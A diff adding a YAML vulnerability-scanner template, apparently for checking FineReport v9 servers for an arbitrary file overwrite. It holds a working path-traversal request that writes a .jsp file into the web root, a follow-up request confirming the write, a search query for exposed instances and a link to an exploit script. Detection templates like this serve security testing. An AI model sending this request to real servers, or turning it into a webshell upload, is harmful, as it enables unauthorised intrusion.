@@ -1,0 +1,26 @@
+name: FineReport v9 Arbitrary File Overwrite
+manual: true
+query: app="fanruansem-FineReport"
+transport: http
+set:
+  str1: randomLowercase(7)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp
+      headers:
+        Content-Type: application/json
+      body: '{"__CONTENT__":{{str1}},"__CHARSET__":"UTF-8"}'
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /WebReport/a.svg.jsp
+    expression: response.status == 200 && response.body.bcontains(b"{{str1}}")
+expression: r0() && r1()
+detail:
+  links:
+  - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.py
+  description: FineReport is an web reporting tool.
+  tags: overwrite
